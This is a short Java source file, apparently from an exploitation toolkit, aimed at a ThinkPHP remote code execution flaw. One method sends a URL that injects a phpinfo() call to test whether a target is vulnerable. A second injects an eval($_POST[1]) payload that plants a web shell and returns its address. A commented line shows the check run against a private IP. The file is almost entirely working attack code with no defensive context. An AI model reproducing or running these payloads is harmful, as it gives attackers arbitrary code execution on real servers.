import java.io.IOException;

public class Thinkphp {

    public static String run(String target) throws IOException {
        HttpRequest request = new HttpRequest();
//        System.out.println(request.get("http://192.168.126.137:18832/index.php?s=/index/index/name/$%7B@phpinfo()%7D"));
        String response = request.get(target + "index.php?s=/index/index/name/$%7B@phpinfo()%7D");
        return response;

    }


    public static String shell(String target) throws IOException {
        HttpRequest request = new HttpRequest();
        request.get(target + "index.php?s=/index/index/name/${@print(eval($_POST[1]))}");
        String shl = target + "index.php?s=/index/index/name/${@print(eval($_POST[1]))}";
        return shl;
    }

}
